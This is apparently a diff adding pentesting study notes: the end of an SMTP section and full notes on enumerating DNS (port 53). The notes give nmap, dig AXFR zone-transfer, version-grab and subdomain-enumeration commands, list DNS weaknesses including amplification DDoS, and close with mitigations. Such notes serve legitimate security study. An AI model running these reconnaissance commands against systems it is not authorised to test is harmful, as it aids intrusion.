+| SMTP email sending test | `swaks --to user@domain.com --server <ip>`              |
+
+---
+
+### 🛡️ **Mitigation Tips**
+
+| Issue            | How to Fix                                         |
+| ---------------- | -------------------------------------------------- |
+| Open Relay       | Disable open relay or restrict by IP addresses     |
+| User Enumeration | Disable VRFY/EXPN commands                         |
+| Weak Passwords   | Enforce strong passwords and rate limiting         |
+| No Encryption    | Use TLS (ports 465/587) and disable plaintext auth |
+| Spoofing         | Set up SPF, DKIM, and DMARC records                |
+
+---
+
+
+
+
+
+Sure! Here are detailed notes on **DNS (Port 53)** for pentesting and enumeration:
+
+---
+
+# 📝 **DNS (Port 53) Full Notes**
+
+---
+
+## 📌 **What is DNS?**
+
+| Port | Service | Why Important?                                                                                                                |
+| ---- | ------- | ----------------------------------------------------------------------------------------------------------------------------- |
+| 53   | DNS     | Domain Name System translates domain names to IPs; crucial for network operations and a target for info gathering and attacks |
+
+DNS is a core internet service that resolves domain names to IP addresses. DNS servers can leak critical information if misconfigured or vulnerable.
+
+---
+
+## 🔍 **DNS Enumeration & Exploitation**
+
+---
+
+### 1️⃣ **Check Open Port**
+
+```bash
+nmap -p 53 <target-ip>
+```
+
+---
+
+### 2️⃣ **Banner Grabbing (DNS does not give banners like HTTP/SMTP, but version can be revealed via queries if misconfigured)**
+
+Try querying version (may fail if server restricted):
+
+```bash
+dig version.bind txt @<target-ip>
+```
+
+---
+
+### 3️⃣ **Basic DNS Queries**
+
+Use `dig` or `nslookup`:
+
+```bash
+dig @<target-ip> example.com
+nslookup example.com <target-ip>
+```
+
+---
+
+### 4️⃣ **Zone Transfer (AXFR)**
+
+If DNS zone transfers are allowed (misconfigured), you can get the full DNS zone — all hostnames, IPs, and records.
+
+Check zone transfer:
+
+```bash
+dig AXFR example.com @<target-ip>
+```
+
+If zone transfer allowed, you get all DNS records.
+
+---
+
+### 5️⃣ **DNS Enumeration Tools**
+
+* **dnsenum**: Automated DNS enumeration
+* **dnsrecon**: DNS reconnaissance & enumeration
+* **fierce**: DNS scanner for subdomain enumeration and zone transfers
+* **dig**: Manual DNS queries
+* **host**: DNS lookup utility
+
+Example:
+
+```bash
+dnsrecon -d example.com -n <target-ip>
+```
+
+---
+
+### 6️⃣ **Enumerate Subdomains**
+
+Look for subdomains which may reveal internal hosts or services.
+
+```bash
+dnsenum example.com
+dnsrecon -d example.com
+```
+
+---
+
+### 7️⃣ **Reverse DNS Lookup**
+
+Find domain names associated with an IP:
+
+```bash
+dig -x <ip>
+```
+
+---
+
+### 8️⃣ **Common DNS Vulnerabilities**
+
+| Vulnerability           | Description                                            |
+| ----------------------- | ------------------------------------------------------ |
+| Zone Transfer Allowed   | Leak all DNS records to attacker                       |
+| DNS Cache Poisoning     | Inject false DNS records to redirect users             |
+| Weak DNSSEC             | No DNSSEC means vulnerable to spoofing                 |
+| Open Recursive Resolver | Allows attackers to abuse for DDoS (DNS amplification) |
+
+---
+
+### 9️⃣ **DNS Amplification Attack**
+
+Misconfigured open recursive resolvers can be abused to launch DDoS attacks by sending small queries with spoofed IPs to flood victims.
+
+---
+
+### 1️⃣0️⃣ **Tools for DNS Pentesting**
+
+| Tool         | Usage                              |
+| ------------ | ---------------------------------- |
+| **dig**      | DNS queries & zone transfers       |
+| **dnsenum**  | Automated subdomain enumeration    |
+| **dnsrecon** | DNS enumeration & brute forcing    |
+| **fierce**   | DNS reconnaissance & zone transfer |
+| **host**     | Simple DNS lookups                 |
+
+---
+
+### 🚀 **Quick Commands Recap**
+
+| Task                | Command Example              |
+| ------------------- | ---------------------------- |
+| Port scan           | `nmap -p 53 <ip>`            |
+| Zone transfer check | `dig AXFR example.com @<ip>` |
+| Subdomain enum      | `dnsenum example.com`        |
+| Reverse DNS lookup  | `dig -x <ip>`                |
+| DNS version grab    | `dig version.bind txt @<ip>` |
+
+---
+
+### 🛡️ **Mitigation Tips**
+
+| Issue                   | How to Fix                                |
+| ----------------------- | ----------------------------------------- |
+| Zone Transfer Allowed   | Restrict zone transfers to authorized IPs |
+| Open Recursive Resolver | Disable open recursion or restrict access |
+| No DNSSEC               | Implement DNSSEC for authenticity         |
+| Cache Poisoning         | Patch DNS software and enable DNSSEC      |
+
+---
+
+
